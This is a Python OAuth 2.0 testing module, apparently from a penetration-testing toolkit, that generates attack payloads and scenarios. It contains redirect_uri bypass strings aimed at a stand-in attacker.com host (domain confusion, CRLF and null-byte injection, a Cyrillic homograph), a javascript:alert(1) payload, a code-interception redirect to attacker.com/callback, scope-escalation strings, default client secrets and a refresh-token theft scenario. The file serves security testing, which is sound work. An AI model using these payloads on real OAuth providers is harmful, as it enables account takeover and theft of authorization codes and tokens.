#!/usr/bin/env python3
"""
OAuth 2.0 Flow Testing Module
Tests for OAuth vulnerabilities: redirect_uri bypass, state parameter, token theft
"""

from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class OAuthTester:
    """OAuth 2.0 vulnerability testing"""

    @staticmethod
    def redirect_uri_bypass_payloads(original_redirect: str) -> List[str]:
        """
        Generate redirect_uri bypass payloads

        Args:
            original_redirect: Original redirect_uri (e.g., https://example.com/callback)

        Returns:
            List of bypass payloads
        """
        parsed = urlparse(original_redirect)
        domain = parsed.netloc
        path = parsed.path

        payloads = [
            # Open redirect
            f"{original_redirect}?next=https://attacker.com",
            f"{original_redirect}#https://attacker.com",
            # Path traversal
            f"{parsed.scheme}://{domain}{path}/../../../attacker.com",
            f"{parsed.scheme}://{domain}{path}/../../attacker.com",
            # Subdomain bypass
            f"{parsed.scheme}://attacker.{domain}{path}",
            f"{parsed.scheme}://{domain}.attacker.com{path}",
            # Domain confusion
            f"{parsed.scheme}://{domain}@attacker.com{path}",
            f"{parsed.scheme}://attacker.com@{domain}{path}",
            f"{parsed.scheme}://{domain}%2eattacker.com{path}",
            # Protocol bypass
            f"http://{domain}{path}",  # If original is https
            f"javascript:alert(1)//{domain}{path}",
            # Null byte injection
            f"{parsed.scheme}://{domain}%00.attacker.com{path}",
            # CRLF injection
            f"{original_redirect}%0d%0aLocation:%20https://attacker.com",
            # Wildcard abuse
            f"{parsed.scheme}://evil-{domain}{path}",
            f"{parsed.scheme}://{domain}-evil.com{path}",
            # IDN homograph
            f"{parsed.scheme}://еxample.com{path}",  # Cyrillic 'e'
            # Fragment bypass
            f"{original_redirect}#@attacker.com",
            # Backslash bypass
            f"{parsed.scheme}://{domain}\\@attacker.com{path}",
            # Double encoding
            f"{parsed.scheme}://{domain}%252e%252e%252fattacker.com{path}",
        ]

        return payloads

    @staticmethod
    def state_parameter_attacks() -> List[Dict]:
        """
        Generate state parameter attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Missing state parameter",
                "description": "CSRF attack - no state validation",
                "test": "Remove state parameter from OAuth flow",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI",
            },
            {
                "name": "Empty state parameter",
                "description": "State parameter present but empty",
                "test": "Set state to empty string",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=",
            },
            {
                "name": "Predictable state",
                "description": "State parameter is predictable (e.g., timestamp)",
                "test": "Use predictable values like '1', '123', timestamp",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=1",
            },
            {
                "name": "State reuse",
                "description": "Reuse same state token multiple times",
                "test": "Complete OAuth flow twice with same state",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=REUSED_STATE",
            },
        ]

    @staticmethod
    def implicit_flow_attacks() -> List[Dict]:
        """
        Generate implicit flow attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Token in URL fragment",
                "description": "Access token exposed in URL (referer leakage)",
                "test": "Check if access_token is in URL fragment",
                "risk": "HIGH - Token can leak via Referer header",
            },
            {
                "name": "No token expiration",
                "description": "Access token never expires",
                "test": "Use old access token after long time",
                "risk": "MEDIUM - Stolen tokens valid forever",
            },
            {
                "name": "Token in browser history",
                "description": "Token stored in browser history",
                "test": "Check browser history for access_token",
                "risk": "HIGH - Token accessible to malware",
            },
        ]

    @staticmethod
    def scope_escalation_payloads() -> List[str]:
        """
        Generate scope escalation payloads

        Returns:
            List of scope payloads
        """
        return [
            # Request excessive scopes
            "scope=read write admin delete",
            "scope=*",
            "scope=all",
            "scope=user:email user:admin repo:delete",
            # Scope injection
            "scope=read%20admin",
            "scope=read+admin",
            "scope=read%0aadmin",
            # Wildcard scopes
            "scope=user:*",
            "scope=repo:*",
            "scope=admin:*",
        ]

    @staticmethod
    def client_secret_attacks() -> List[Dict]:
        """
        Generate client secret attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Client secret in JavaScript",
                "description": "Client secret exposed in frontend code",
                "test": "Search JS files for client_secret, api_key",
                "pattern": r"client_secret['\"]?\s*[:=]\s*['\"]([^'\"]+)",
            },
            {
                "name": "Client secret in mobile app",
                "description": "Client secret hardcoded in mobile app",
                "test": "Decompile APK/IPA and search for secrets",
                "pattern": r"client_secret|api_key|oauth_secret",
            },
            {
                "name": "Weak client secret",
                "description": "Client secret is weak or default",
                "test": "Try common secrets: 'secret', 'password', '123456'",
                "common_secrets": [
                    "secret",
                    "password",
                    "123456",
                    "client_secret",
                    "oauth",
                ],
            },
        ]

    @staticmethod
    def authorization_code_attacks() -> List[Dict]:
        """
        Generate authorization code attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Code replay attack",
                "description": "Reuse authorization code multiple times",
                "test": "Exchange same code for token twice",
                "expected": "Second exchange should fail",
            },
            {
                "name": "Code interception",
                "description": "Intercept authorization code via redirect",
                "test": "Use attacker's redirect_uri to steal code",
                "payload": "redirect_uri=https://attacker.com/callback",
            },
            {
                "name": "Code without PKCE",
                "description": "Authorization code flow without PKCE protection",
                "test": "Complete flow without code_challenge parameter",
                "risk": "HIGH - Vulnerable to code interception",
            },
        ]

    @staticmethod
    def token_endpoint_attacks() -> List[Dict]:
        """
        Generate token endpoint attack payloads

        Returns:
            List of attack payloads
        """
        return [
            {
                "name": "Client credentials in URL",
                "description": "Send client_id/secret in URL instead of body",
                "payload": "/token?grant_type=authorization_code&code=CODE&client_id=ID&client_secret=SECRET",
            },
            {
                "name": "Missing client authentication",
                "description": "Exchange code without client credentials",
                "payload": {
                    "grant_type": "authorization_code",
                    "code": "CODE",
                    "redirect_uri": "URI",
                },
            },
            {
                "name": "Grant type confusion",
                "description": "Use wrong grant type",
                "payload": {
                    "grant_type": "password",
                    "username": "admin",
                    "password": "admin",
                },
            },
            {
                "name": "Refresh token theft",
                "description": "Steal and reuse refresh token",
                "payload": {
                    "grant_type": "refresh_token",
                    "refresh_token": "STOLEN_TOKEN",
                },
            },
        ]

    @staticmethod
    def generate_oauth_test_suite(
        base_url: str, redirect_uri: str, client_id: str
    ) -> Dict:
        """
        Generate complete OAuth test suite

        Args:
            base_url: OAuth provider base URL
            redirect_uri: Application redirect URI
            client_id: OAuth client ID

        Returns:
            Dict with all OAuth attack scenarios
        """
        return {
            "redirect_uri_bypass": OAuthTester.redirect_uri_bypass_payloads(
                redirect_uri
            ),
            "state_attacks": OAuthTester.state_parameter_attacks(),
            "implicit_flow": OAuthTester.implicit_flow_attacks(),
            "scope_escalation": OAuthTester.scope_escalation_payloads(),
            "client_secret": OAuthTester.client_secret_attacks(),
            "authorization_code": OAuthTester.authorization_code_attacks(),
            "token_endpoint": OAuthTester.token_endpoint_attacks(),
        }


# Test
if __name__ == "__main__":
    print("OAuth 2.0 Testing Module\n")

    test_redirect = "https://example.com/oauth/callback"

    print("=== Redirect URI Bypass Payloads ===")
    bypass_payloads = OAuthTester.redirect_uri_bypass_payloads(test_redirect)
    for i, payload in enumerate(bypass_payloads[:5], 1):
        print(f"{i}. {payload}")
    print(f"... ({len(bypass_payloads)} total)\n")

    print("=== State Parameter Attacks ===")
    state_attacks = OAuthTester.state_parameter_attacks()
    for attack in state_attacks:
        print(f"- {attack['name']}: {attack['description']}")
    print()

    print("=== Scope Escalation Payloads ===")
    scope_payloads = OAuthTester.scope_escalation_payloads()
    for payload in scope_payloads[:5]:
        print(f"  {payload}")
    print()

    print("=== Authorization Code Attacks ===")
    code_attacks = OAuthTester.authorization_code_attacks()
    for attack in code_attacks:
        print(f"- {attack['name']}: {attack['description']}")
    print()

    print("=== Complete Test Suite ===")
    test_suite = OAuthTester.generate_oauth_test_suite(
        "https://oauth.example.com", "https://app.example.com/callback", "client_123"
    )

    for category, tests in test_suite.items():
        print(f"{category}: {len(tests)} tests")
